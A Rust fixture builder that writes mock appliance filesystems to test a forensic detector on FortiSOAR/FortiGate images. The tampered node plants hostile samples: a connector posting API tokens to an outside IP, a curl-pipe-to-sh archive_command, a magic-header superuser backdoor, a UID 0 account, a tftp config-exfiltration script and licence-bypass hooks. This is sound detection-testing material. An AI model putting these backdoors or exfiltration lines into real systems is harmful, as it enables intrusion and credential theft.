//! Deterministic Synthetic Forensic Scenario Builder (`clean_factory_node`, `org_alpha_node`, `org_beta_node`).
//!
//! Constructs completely inert, non-executable QA/CI mock directory trees inside an
//! isolated `--workspace-dir` (e.g. `/tmp/fsr_qa_benchmark`) to validate zero false
//! positives on a clean factory image and 100% end-to-end multi-phase detection +
//! Golden Image clone correlation across two simulated tenant deployments.

use std::fs;
use std::path::{Path, PathBuf};

use fsr_deep_audit::crypto::sha256_hex;

use crate::binary_synthesizers::{
    build_elf64_shared_object, build_ext4_superblock_4096, build_pep552_pyc_311,
    build_pg_control_8192, build_rpm_v4_header_blob, build_sqlite3_rpmdb_bytes,
    build_wtmp_record_x86_64, build_x509v3_self_signed_pem, build_xfs_v5_superblock_4096,
    CLEAN_CET_PROLOGUE_X86_64, QA_CET_RET_ONE_STUB, QA_CET_RET_ZERO_STUB, QA_FORTINET_PGP_KEY_ID,
};

/// Paths of all 3 synthetic scenario nodes and auxiliary test configs inside `--workspace-dir`.
#[derive(Debug, Clone)]
pub struct BuiltQaWorkspace {
    pub workspace_dir: PathBuf,
    pub clean_node_root: PathBuf,
    pub org_alpha_root: PathBuf,
    pub org_beta_root: PathBuf,
    pub org_alpha_fgt_config: PathBuf,
    pub org_alpha_fgvm_lic: PathBuf,
}

/// Shared Golden Image birthmark constants injected identically into `org_alpha_node` and `org_beta_node`.
pub const GOLDEN_SHARED_PG_SYSTEM_ID: u64 = 6_666_777_788_889_999_001;
pub const GOLDEN_SHARED_EXT4_UUID: [u8; 16] = [
    0xde, 0xad, 0xbe, 0xef, 0x11, 0x11, 0x42, 0x22, 0x83, 0x33, 0x44, 0x44, 0x55, 0x55, 0x66, 0x66,
];
pub const GOLDEN_SHARED_XFS_UUID: [u8; 16] = [
    0xca, 0xfe, 0xba, 0xbe, 0x22, 0x22, 0x43, 0x33, 0x94, 0x44, 0x77, 0x77, 0x88, 0x88, 0x99, 0x99,
];
pub const GOLDEN_SHARED_XFS_META_UUID: [u8; 16] = [
    0xab, 0xcd, 0xef, 0x01, 0x33, 0x33, 0x44, 0x44, 0x85, 0x55, 0x99, 0x99, 0xaa, 0xaa, 0xbb, 0xbb,
];
pub const GOLDEN_SHARED_VAULT_SECRET_KEY: &str =
    "GoldenImageSharedMasterVaultKey_2026_PiratedAppliance_X9zQ7mW2!";
pub const GOLDEN_SHARED_FGVM_SERIAL: &str = "FGVM080000889900";

/// Clean factory node unique birthmark constants (must never collide with Golden Image nodes).
pub const CLEAN_FACTORY_PG_SYSTEM_ID: u64 = 8_100_200_300_400_500_601;

/// Rebuilds the entire isolated QA benchmark workspace from scratch.
pub fn build_all_qa_scenarios(workspace_dir: &Path) -> Result<BuiltQaWorkspace, String> {
    if workspace_dir == Path::new("/") || workspace_dir.as_os_str().is_empty() {
        return Err("refusing to build QA workspace at filesystem root `/`".to_string());
    }

    if workspace_dir.exists() {
        fs::remove_dir_all(workspace_dir).map_err(|e| {
            format!(
                "failed to clean previous QA workspace '{}': {}",
                workspace_dir.display(),
                e
            )
        })?;
    }
    fs::create_dir_all(workspace_dir).map_err(|e| {
        format!(
            "failed to create QA workspace '{}': {}",
            workspace_dir.display(),
            e
        )
    })?;

    let clean_node_root = workspace_dir.join("clean_factory_node");
    let org_alpha_root = workspace_dir.join("org_alpha_node");
    let org_beta_root = workspace_dir.join("org_beta_node");
    let aux_dir = workspace_dir.join("auxiliary_configs");
    fs::create_dir_all(&aux_dir).map_err(|e| e.to_string())?;

    populate_clean_factory_node(&clean_node_root)?;
    let (org_alpha_fgt_config, org_alpha_fgvm_lic) =
        populate_org_alpha_node(&org_alpha_root, &aux_dir)?;
    populate_org_beta_node(&org_beta_root)?;

    Ok(BuiltQaWorkspace {
        workspace_dir: workspace_dir.to_path_buf(),
        clean_node_root,
        org_alpha_root,
        org_beta_root,
        org_alpha_fgt_config,
        org_alpha_fgvm_lic,
    })
}

// ============================================================================
// Scenario A: Clean Factory Reference Node (`clean_factory_node` -> 0 Findings)
// ============================================================================

pub fn populate_clean_factory_node(root: &Path) -> Result<(), String> {
    mk_dirs(
        root,
        &[
            "etc/nginx/conf.d",
            "etc/pam.d",
            "etc/pki/tls/certs",
            "etc/pki/ca-trust/source/anchors",
            "etc/ssh",
            "etc/systemd/system",
            "usr/bin",
            "usr/lib64/security",
            "var/lib/dbus",
            "var/lib/fs_images",
            "var/lib/pgsql/16/data/global",
            "var/lib/rpm",
            "opt/cyops/api/sealab",
            "opt/cyops/lib/python3.9/site-packages/certifi",
            "opt/cyops-core",
            "opt/cyops-licensing/cyops_licensing/__pycache__",
            "opt/cyops-integrations/integrations/connectors/virustotal_3_1_0",
        ],
    )?;

    // 1. OS Identity, Auth & Network Baseline
    write_f(root, "etc/hostname", b"fsr-clean-factory-01\n")?;
    write_f(
        root,
        "etc/machine-id",
        b"f0e1d2c3b4a5968778695a4b3c2d1e0f\n",
    )?;
    write_f(
        root,
        "var/lib/dbus/machine-id",
        b"f0e1d2c3b4a5968778695a4b3c2d1e0f\n",
    )?;
    write_f(
        root,
        "etc/passwd",
        b"root:x:0:0:root:/root:/bin/bash\n\
          postgres:x:26:26:PostgreSQL Server:/var/lib/pgsql:/bin/bash\n\
          csadmin:x:1000:1000:FortiSOAR Admin:/home/csadmin:/bin/bash\n",
    )?;
    write_f(
        root,
        "etc/hosts",
        b"127.0.0.1 localhost localhost.localdomain\n::1 localhost6\n",
    )?;
    write_f(root, "etc/resolv.conf", b"nameserver 9.9.9.9\n")?;
    write_f(
        root,
        "etc/ssh/sshd_config",
        b"PermitRootLogin no\nPermitEmptyPasswords no\nPasswordAuthentication yes\n",
    )?;
    write_f(
        root,
        "etc/pam.d/sshd",
        b"auth required pam_sepermit.so\nauth substack password-auth\naccount required pam_nologin.so\n",
    )?;

    // 2. Clean ELF64 Shared Objects (`libssl.so.3`, `pam_unix.so`, `/usr/bin/rpm`)
    let clean_libssl = build_elf64_shared_object(
        &[
            ("X509_verify_cert", CLEAN_CET_PROLOGUE_X86_64),
            ("SSL_get_verify_result", CLEAN_CET_PROLOGUE_X86_64),
            ("SSL_CTX_set_verify", CLEAN_CET_PROLOGUE_X86_64),
        ],
        None,
        false,
    );
    write_f(root, "usr/lib64/libssl.so.3", &clean_libssl)?;

    let clean_pam_unix = build_elf64_shared_object(
        &[
            ("pam_sm_authenticate", CLEAN_CET_PROLOGUE_X86_64),
            ("pam_sm_acct_mgmt", CLEAN_CET_PROLOGUE_X86_64),
        ],
        None,
        false,
    );
    write_f(root, "usr/lib64/security/pam_unix.so", &clean_pam_unix)?;

    let clean_rpm_bin = build_elf64_shared_object(&[("main", CLEAN_CET_PROLOGUE_X86_64)], None, false);
    let clean_rpm_bin_sha = sha256_hex(&clean_rpm_bin);
    write_f(root, "usr/bin/rpm", &clean_rpm_bin)?;

    // 3. Clean `cyops-*` files & matching RSA/SHA-256 `rpmdb.sqlite`
    let core_py = b"def run_workflow_step(ctx):\n    return {'status': 'success'}\n";
    let core_py_sha = sha256_hex(core_py);
    write_f(root, "opt/cyops-core/engine.py", core_py)?;

    let lic_py = b"def verify_appliance_license(cert_blob):\n    return check_signature(cert_blob)\n";
    let lic_py_sha = sha256_hex(lic_py);
    write_f(
        root,
        "opt/cyops-licensing/cyops_licensing/validator.py",
        lic_py,
    )?;

    let pkg_rpm = build_rpm_v4_header_blob(
        "rpm",
        "4.16.1.3",
        "29.el9",
        Some(QA_FORTINET_PGP_KEY_ID),
        "/usr/bin/",
        &[("rpm", &clean_rpm_bin_sha, 0)],
        0,
    );
    let pkg_core = build_rpm_v4_header_blob(
        "cyops-core",
        "7.6.0",
        "1.el9",
        Some(QA_FORTINET_PGP_KEY_ID),
        "/opt/cyops-core/",
        &[("engine.py", &core_py_sha, 0)],
        6_000, // Exercises multi-page SQLite3 overflow chain cleanly
    );
    let pkg_lic = build_rpm_v4_header_blob(
        "cyops-licensing",
        "7.6.0",
        "1.el9",
        Some(QA_FORTINET_PGP_KEY_ID),
        "/opt/cyops-licensing/cyops_licensing/",
        &[("validator.py", &lic_py_sha, 0)],
        0,
    );
    let rpmdb_sqlite = build_sqlite3_rpmdb_bytes(&[pkg_rpm, pkg_core, pkg_lic]);
    write_f(root, "var/lib/rpm/rpmdb.sqlite", &rpmdb_sqlite)?;

    // 4. Cohesive Cohort of 6 Clean PEP 552 `.pyc` Files
    let base_pyc_ts = 1_750_000_000u32;
    for idx in 0..6u32 {
        let pyc = build_pep552_pyc_311(
            base_pyc_ts + idx * 2,
            256,
            &format!("clean_helper_{}", idx),
            false,
        );
        write_f(
            root,
            &format!(
                "opt/cyops-licensing/cyops_licensing/__pycache__/mod_{}.cpython-311.pyc",
                idx
            ),
            &pyc,
        )?;
    }

    // 5. Accredited Standard WebPKI Root CA PEM (`DigiCert Global Root G2`)
    let webpki_pem = build_x509v3_self_signed_pem(
        &[0x03, 0x3a, 0xf1, 0xe6, 0xa7, 0x11, 0xa9, 0xa0],
        "DigiCert Inc",
        "DigiCert Global Root G2",
        true,
        None,
        0x11,
    );
    write_f(root, "etc/pki/tls/certs/ca-bundle.crt", webpki_pem.as_bytes())?;
    write_f(
        root,
        "opt/cyops/lib/python3.9/site-packages/certifi/cacert.pem",
        webpki_pem.as_bytes(),
    )?;

    // 6. Unique PostgreSQL `pg_control` (valid CRC32C), Unique Superblocks & High-Entropy Seed
    let pg_ctrl = build_pg_control_8192(CLEAN_FACTORY_PG_SYSTEM_ID, 1_750_000_100);
    write_f(root, "var/lib/pgsql/16/data/global/pg_control", &pg_ctrl)?;
    write_f(
        root,
        "var/lib/pgsql/16/data/postgresql.conf",
        b"shared_preload_libraries = 'pg_stat_statements'\narchive_command = '/bin/true'\n",
    )?;
    write_f(
        root,
        "var/lib/pgsql/16/data/pg_hba.conf",
        b"local all postgres peer\nhost all all 127.0.0.1/32 scram-sha-256\n",
    )?;

    let clean_ext4 = build_ext4_superblock_4096(
        [
            0x01, 0x23, 0x45, 0x67, 0x89, 0xab, 0x4c, 0xde, 0x8f, 0x01, 0x23, 0x45, 0x67, 0x89,
            0xab, 0xcd,
        ],
        1_745_000_000,
        1_750_000_050,
        "fsr-clean-root",
    );
    write_f(root, "var/lib/fs_images/clean_root.img", &clean_ext4)?;

    // 7. Clean Nginx, Django `settings.py`, and Official-Vendor SOAR Connector
    write_f(
        root,
        "etc/nginx/nginx.conf",
        b"http {\n  server {\n    location /api/ {\n      proxy_pass https://127.0.0.1:8443;\n    }\n  }\n}\n",
    )?;
    write_f(
        root,
        "opt/cyops/api/sealab/settings.py",
        b"SECRET_KEY = 'kP9xQ4mZ8vR2nL7wB5tJ3yH6fD1cS0gA!eU#iO%rY&pW*qM+zN'\n\
          MIDDLEWARE = [\n\
              'django.middleware.security.SecurityMiddleware',\n\
              'django.contrib.sessions.middleware.SessionMiddleware',\n\
              'django.contrib.auth.middleware.AuthenticationMiddleware',\n\
          ]\n",
    )?;
    write_f(
        root,
        "opt/cyops-integrations/integrations/connectors/virustotal_3_1_0/info.json",
        br#"{"name": "virustotal", "version": "3.1.0", "publisher": "Fortinet", "label": "VirusTotal"}"#,
    )?;
    write_f(
        root,
        "opt/cyops-integrations/integrations/connectors/virustotal_3_1_0/operations.py",
        b"import requests\n\
          def check_health(config):\n\
          \x20   api_key = config.get('api_key')\n\
          \x20   resp = requests.get('https://www.virustotal.com/api/v3/files', headers={'x-apikey': api_key}, verify=True)\n\
          \x20   return resp.status_code == 200\n",
    )?;

    Ok(())
}

// ============================================================================
// Scenario B: Cloned & Multi-Layer Tampered Node (`org_alpha_node`)
// ============================================================================

fn populate_org_alpha_node(root: &Path, aux_dir: &Path) -> Result<(PathBuf, PathBuf), String> {
    mk_dirs(
        root,
        &[
            "etc/nginx/conf.d",
            "etc/pam.d",
            "etc/pki/tls/certs",
            "etc/pki/ca-trust/source/anchors",
            "etc/ssh",
            "etc/systemd/system",
            "proc/1",
            "proc/4242",
            "proc/net",
            "sys/fs/bpf",
            "usr/bin",
            "usr/lib64/security",
            "var/lib/dbus",
            "var/lib/fs_images",
            "var/lib/pgsql/16/data/global",
            "var/lib/rpm",
            "var/log",
            "opt/cyops/api/sealab",
            "opt/cyops/lib/python3.9/site-packages/certifi",
            "opt/cyops-core",
            "opt/cyops-licensing/lib",
            "opt/cyops-licensing/cyops_licensing/__pycache__",
            "opt/cyops-integrations/integrations/connectors/qa_edr_skimmer_1_0_0",
        ],
    )?;

    write_f(root, "etc/hostname", b"org-alpha-soar-prod\n")?;
    write_f(
        root,
        "etc/machine-id",
        b"aaaaaaaaaaaaaaaa1111111111111111\n",
    )?;

    // --- Shared Golden Image Birthmarks (identical to `org_beta_node`) ---
    inject_shared_golden_image_birthmarks(root)?;

    // --- Phase 1 QA Vectors: HW Spoof Hook, ELF64 VMA/GOT Diff, PEP 552 Stub, RPM Tamper ---
    write_f(root, "etc/ld.so.preload", b"/tmp/.qa_mock_hwid_hook.so\n")?;
    write_f(
        root,
        "proc/1/environ",
        b"PATH=/usr/sbin:/usr/bin\0LD_PRELOAD=/dev/shm/qa_mock_uuid.so\0",
    )?;

    let disk_lic_so = build_elf64_shared_object(
        &[("verify_license_blob", CLEAN_CET_PROLOGUE_X86_64)],
        None,
        true,
    );
    write_f(root, "opt/cyops-licensing/lib/liblicverify.so", &disk_lic_so)?;
    write_f(root, "proc/4242/comm", b"uwsgi\n")?;
    write_f(
        root,
        "proc/4242/cmdline",
        b"/opt/cyops/bin/uwsgi\0--ini\0/etc/cyops/uwsgi.ini\0",
    )?;
    write_f(
        root,
        "proc/4242/maps",
        b"00010000-00011000 r-xp 00000000 fd:00 0 /opt/cyops-licensing/lib/liblicverify.so\n\
          00012000-00013000 rw-p 00002000 fd:00 0 /opt/cyops-licensing/lib/liblicverify.so\n\
          00020000-00021000 r-xp 00000000 00:01 99 /dev/shm/qa_ephemeral_patch.so (deleted)\n",
    )?;
    let mut mem_img = vec![0u8; 0x21000];
    mem_img[0x10000..0x11000].copy_from_slice(&disk_lic_so[0x0..0x1000]);
    mem_img[0x12000..0x12800].copy_from_slice(&disk_lic_so[0x2000..0x2800]);
    // Inert inline `.text` test byte difference + GOT slot redirection in mock `/proc/4242/mem`
    mem_img[0x10400..0x1040a].copy_from_slice(QA_CET_RET_ONE_STUB);
    mem_img[0x12018..0x12020].copy_from_slice(&0x0002_0040u64.to_le_bytes());
    write_f(root, "proc/4242/mem", &mem_img)?;

    let base_pyc_ts = 1_750_000_000u32;
    for idx in 0..6u32 {
        let pyc = build_pep552_pyc_311(
            base_pyc_ts + idx * 2,
            256,
            &format!("helper_{}", idx),
            false,
        );
        write_f(
            root,
            &format!(
                "opt/cyops-licensing/cyops_licensing/__pycache__/mod_{}.cpython-311.pyc",
                idx
            ),
            &pyc,
        )?;
    }
    let stub_pyc = build_pep552_pyc_311(
        base_pyc_ts + 35 * 86_400, // +35 days statistical timestamp outlier
        256,
        "validate_fortiguard_license",
        true,
    );
    write_f(
        root,
        "opt/cyops-licensing/cyops_licensing/__pycache__/license_validator.cpython-311.pyc",
        &stub_pyc,
    )?;

    // RPM DB with RPATH-tainted `/usr/bin/rpm`, modified `validator.py`, and unsigned `cyops-repack`
    let rpath_rpm_bin =
        build_elf64_shared_object(&[("main", CLEAN_CET_PROLOGUE_X86_64)], Some("/tmp/qa_rpath"), false);
    write_f(root, "usr/bin/rpm", &rpath_rpm_bin)?;

    let orig_validator_sha = sha256_hex(b"def validate(): return check_sig()\n");
    write_f(
        root,
        "opt/cyops-licensing/cyops_licensing/validator.py",
        b"def validate(): return True  # QA mock modified digest\n",
    )?;
    let pkg_tampered_lic = build_rpm_v4_header_blob(
        "cyops-licensing",
        "7.6.0",
        "1.el9",
        Some(QA_FORTINET_PGP_KEY_ID),
        "/opt/cyops-licensing/cyops_licensing/",
        &[("validator.py", &orig_validator_sha, 0)],
        0,
    );
    let pkg_unsigned = build_rpm_v4_header_blob(
        "cyops-ui-repack",
        "7.6.0",
        "99.qa",
        None,
        "/opt/cyops-licensing/cyops_licensing/",
        &[],
        0,
    );
    write_f(
        root,
        "var/lib/rpm/rpmdb.sqlite",
        &build_sqlite3_rpmdb_bytes(&[pkg_tampered_lic, pkg_unsigned]),
    )?;

    // --- Phase 2 QA Vectors: AS40934 Route, Hosts Redirect, eBPF Pin, Rogue CA, CET `libssl` ---
    write_f(
        root,
        "etc/hosts",
        b"127.0.0.1 localhost\n10.254.254.10 update.fortiguard.net service.fortiguard.net\n",
    )?;
    // 173.243.128.0/19 (Fortinet AS40934) in Linux `/proc/net/route` little-endian hex:
    // Dest = 0080F3AD, Gateway = 01FEFE0A (10.254.254.1), Mask = 00E0FFFF
    write_f(
        root,
        "proc/net/route",
        b"Iface\tDestination\tGateway\tFlags\tRefCnt\tUse\tMetric\tMask\tMTU\tWindow\tIRTT\n\
          eth0\t0080F3AD\t01FEFE0A\t0003\t0\t0\t100\t00E0FFFF\t0\t0\t0\n",
    )?;
    write_f(root, "sys/fs/bpf/qa_cgroup_connect4_redirect", b"BPF_QA_PIN")?;

    let rogue_ca_pem = build_x509v3_self_signed_pem(
        &[0xde, 0xad, 0xca, 0x01],
        "Fortinet Fake Emulator Lab",
        "FortiGuard QA Emulator Root CA",
        true,
        None,
        0x77,
    );
    write_f(
        root,
        "etc/pki/ca-trust/source/anchors/qa_emulator_ca.crt",
        rogue_ca_pem.as_bytes(),
    )?;
    write_f(
        root,
        "opt/cyops/lib/python3.9/site-packages/certifi/cacert.pem",
        rogue_ca_pem.as_bytes(),
    )?;

    let cet_stub_libssl = build_elf64_shared_object(
        &[
            ("X509_verify_cert", QA_CET_RET_ONE_STUB),
            ("SSL_get_verify_result", CLEAN_CET_PROLOGUE_X86_64),
        ],
        None,
        false,
    );
    write_f(root, "usr/lib64/libssl.so.3", &cet_stub_libssl)?;

    // --- Phase 3 QA Vectors: `wtmp` Clock Rewind, `FAKETIME`, `FGVMEV` License Limit Bypass ---
    let mut wtmp_bytes = Vec::new();
    wtmp_bytes.extend_from_slice(&build_wtmp_record_x86_64(7, 1100, "csadmin", 1_760_020_000));
    wtmp_bytes.extend_from_slice(&build_wtmp_record_x86_64(4, 0, "runlevel", 1_760_050_000)); // OLD_TIME
    wtmp_bytes.extend_from_slice(&build_wtmp_record_x86_64(3, 0, "runlevel", 1_755_000_000)); // NEW_TIME (-58 days)
    write_f(root, "var/log/wtmp", &wtmp_bytes)?;

    write_f(
        root,
        "etc/systemd/system/cyops-uwsgi.service",
        b"[Service]\n\
          Environment=\"LD_PRELOAD=/usr/local/lib/libfaketime.so.1\"\n\
          Environment=\"FAKETIME=@2025-01-01 00:00:00\"\n\
          ExecStart=/opt/cyops/bin/uwsgi\n",
    )?;

    let fgvm_eval_lic = aux_dir.join("org_alpha_fgvmev.lic");
    fs::write(
        &fgvm_eval_lic,
        b"-----BEGIN FGT VM LICENSE-----\n\
          SERIALNO=FGVMEV0000000000\n\
          LENC=0\n\
          CPU=16\n\
          MEM=32768\n\
          -----END FGT VM LICENSE-----\n",
    )
    .map_err(|e| e.to_string())?;

    let mut cpuinfo_buf = String::new();
    for core_id in 0..16u32 {
        cpuinfo_buf.push_str(&format!(
            "processor\t: {}\nmodel name\t: QEMU Virtual CPU version 2.5+\n\n",
            core_id
        ));
    }
    write_f(root, "proc/cpuinfo", cpuinfo_buf.as_bytes())?;
    write_f(
        root,
        "proc/meminfo",
        b"MemTotal:       33554432 kB\nMemFree:        16777216 kB\n",
    )?;

    // --- Phase 4 QA Vectors: Connector Skimmer, Nginx Mirror, Django Bypass, PG, PAM CET, FGT ---
    write_f(
        root,
        "opt/cyops-integrations/integrations/connectors/qa_edr_skimmer_1_0_0/info.json",
        br#"{"name": "sentinelone", "version": "1.0.0", "publisher": "Fortinet", "label": "SentinelOne"}"#,
    )?;
    write_f(
        root,
        "opt/cyops-integrations/integrations/connectors/qa_edr_skimmer_1_0_0/operations.py",
        b"import requests, base64\n\
          def execute(config, operation, params):\n\
          \x20   api_token = config.get('api_token')\n\
          \x20   requests.post('https://198.51.100.88:8443/qa_sink', json={'secret': api_token})\n\
          \x20   eval(base64.b64decode('MTArMTA='))\n\
          \x20   return {'ok': True}\n",
    )?;

    write_f(
        root,
        "etc/nginx/nginx.conf",
        b"http {\n\
            server {\n\
              location /api/ {\n\
                mirror /_qa_shadow_mirror;\n\
                proxy_pass http://127.0.0.1:8000;\n\
              }\n\
            }\n\
          }\n",
    )?;
    write_f(
        root,
        "opt/cyops/api/sealab/middleware_qa_bypass.py",
        b"class QaShadowAuthMiddleware:\n\
          \x20   def __call__(self, request):\n\
          \x20       if request.META.get('HTTP_X_QA_MAGIC_KEY') == 'qa_bypass_token':\n\
          \x20           request.user.is_superuser = True\n",
    )?;

    write_f(
        root,
        "var/lib/pgsql/16/data/postgresql.conf",
        b"shared_preload_libraries = 'pg_stat_statements, /tmp/qa_mock_preload.so'\n\
          archive_command = 'curl -fsSL http://198.51.100.99/wal_hook.sh | sh'\n",
    )?;
    write_f(
        root,
        "var/lib/pgsql/16/data/pg_hba.conf",
        b"host all all 0.0.0.0/0 trust\n",
    )?;

    let cet_stub_pam = build_elf64_shared_object(
        &[
            ("pam_sm_authenticate", QA_CET_RET_ZERO_STUB),
            ("pam_sm_acct_mgmt", CLEAN_CET_PROLOGUE_X86_64),
        ],
        None,
        false,
    );
    write_f(root, "usr/lib64/security/pam_unix.so", &cet_stub_pam)?;
    write_f(
        root,
        "etc/passwd",
        b"root:x:0:0:root:/root:/bin/bash\nqa_ghost_admin:x:0:0:QA Mock UID0:/tmp:/bin/sh\n",
    )?;

    let fgt_config_path = aux_dir.join("org_alpha_fortigate.conf");
    fs::write(
        &fgt_config_path,
        b"config system global\n\
              set hostname \"fgt-alpha-edge\"\n\
              set alias \"FGVMEV-QA\"\n\
          end\n\
          config system fortiguard\n\
              set fortiguard-anycast disable\n\
              set sdns-server-ip \"198.51.100.210\"\n\
          end\n\
          config system central-management\n\
              set type fortimanager\n\
              set fmg \"198.51.100.210\"\n\
              config server-list\n\
                  edit 1\n\
                      set server-type update rating\n\
                      set server-address 198.51.100.210\n\
                  next\n\
              end\n\
          end\n\
          config system admin\n\
              edit \"qa_rogue_super\"\n\
                  set accprofile \"super_admin\"\n\
                  set trusthost1 0.0.0.0 0.0.0.0\n\
              next\n\
          end\n\
          config system auto-script\n\
              edit \"qa_backup_exfil\"\n\
                  set script \"execute backup full-config tftp qa.conf 198.51.100.220\"\n\
              next\n\
          end\n\
          config system api-user\n\
              edit \"qa_open_api\"\n\
                  set accprofile \"super_admin\"\n\
              next\n\
          end\n",
    )
    .map_err(|e| e.to_string())?;

    Ok((fgt_config_path, fgvm_eval_lic))
}

// ============================================================================
// Scenario C: Cloned Peer Organization Node (`org_beta_node`)
// ============================================================================

fn populate_org_beta_node(root: &Path) -> Result<(), String> {
    mk_dirs(
        root,
        &[
            "etc/nginx",
            "etc/ssh",
            "var/lib/dbus",
            "var/lib/fs_images",
            "var/lib/pgsql/16/data/global",
            "opt/cyops/api/sealab",
        ],
    )?;

    write_f(root, "etc/hostname", b"org-beta-soar-dr\n")?;
    write_f(
        root,
        "etc/machine-id",
        b"bbbbbbbbbbbbbbbb2222222222222222\n",
    )?;
    write_f(
        root,
        "var/lib/dbus/machine-id",
        b"bbbbbbbbbbbbbbbb2222222222222222\n",
    )?;
    write_f(
        root,
        "etc/passwd",
        b"root:x:0:0:root:/root:/bin/bash\ncsadmin:x:1000:1000:Admin:/home/csadmin:/bin/bash\n",
    )?;
    write_f(root, "etc/hosts", b"127.0.0.1 localhost\n")?;

    // Inject the exact same Golden Image birthmarks (`pg_control` 64-bit ID, EXT4/XFS UUIDs,
    // SOAR Vault `SECRET_KEY`, and `FGVM` X.509 certificate) as `org_alpha_node`!
    inject_shared_golden_image_birthmarks(root)?;

    Ok(())
}

/// Writes the shared Golden Image artifacts into both `org_alpha_node` and `org_beta_node`.
fn inject_shared_golden_image_birthmarks(root: &Path) -> Result<(), String> {
    // 1. Identical 64-bit PostgreSQL `pg_control` `system_identifier` with valid Castagnoli CRC-32C
    let shared_pg = build_pg_control_8192(GOLDEN_SHARED_PG_SYSTEM_ID, 1_750_000_500);
    write_f(root, "var/lib/pgsql/16/data/global/pg_control", &shared_pg)?;

    // 2. Identical EXT4 & XFS v5 Superblock UUIDs
    let shared_ext4 = build_ext4_superblock_4096(
        GOLDEN_SHARED_EXT4_UUID,
        1_740_000_000,
        1_750_000_500,
        "golden-ova-root",
    );
    write_f(root, "var/lib/fs_images/golden_root_ext4.img", &shared_ext4)?;

    let shared_xfs = build_xfs_v5_superblock_4096(
        GOLDEN_SHARED_XFS_UUID,
        GOLDEN_SHARED_XFS_META_UUID,
        "golden-db",
    );
    write_f(root, "var/lib/fs_images/golden_db_xfs.img", &shared_xfs)?;

    // 3. Identical SOAR Vault `SECRET_KEY` inside `settings.py`
    let settings = format!(
        "SECRET_KEY = '{}'\n\
         MIDDLEWARE = [\n\
             'django.middleware.security.SecurityMiddleware',\n\
             'django.contrib.auth.middleware.AuthenticationMiddleware',\n\
         ]\n",
        GOLDEN_SHARED_VAULT_SECRET_KEY
    );
    write_f(root, "opt/cyops/api/sealab/settings.py", settings.as_bytes())?;

    // 4. Identical `FGVM` X.509v3 Certificate (`CN=FGVM080000889900`, identical SPKI SHA-256)
    //    embedded inside `/etc/fortigate_shared.lic` so `fgvm_license_inspect` + `cluster_correlator`
    //    mathematically match both the FGVM serial and the X.509 SPKI across Org Alpha & Org Beta!
    let shared_fgvm_cert_pem = build_x509v3_self_signed_pem(
        &[0x08, 0x00, 0x88, 0x99, 0x00],
        "QA Golden Appliance Image",
        GOLDEN_SHARED_FGVM_SERIAL,
        false,
        Some("fgvm-golden-clone.example"),
        0x99,
    );
    let lic_bundle = format!(
        "SERIALNO={}\n{}\n",
        GOLDEN_SHARED_FGVM_SERIAL, shared_fgvm_cert_pem
    );
    write_f(root, "etc/fortigate_shared.lic", lic_bundle.as_bytes())?;

    Ok(())
}

fn mk_dirs(root: &Path, rels: &[&str]) -> Result<(), String> {
    for rel in rels {
        let p = root.join(rel);
        fs::create_dir_all(&p)
            .map_err(|e| format!("failed to create directory '{}': {}", p.display(), e))?;
    }
    Ok(())
}

fn write_f(root: &Path, rel: &str, content: &[u8]) -> Result<(), String> {
    let p = root.join(rel);
    if let Some(parent) = p.parent() {
        fs::create_dir_all(parent).map_err(|e| e.to_string())?;
    }
    fs::write(&p, content).map_err(|e| format!("failed to write '{}': {}", p.display(), e))
}
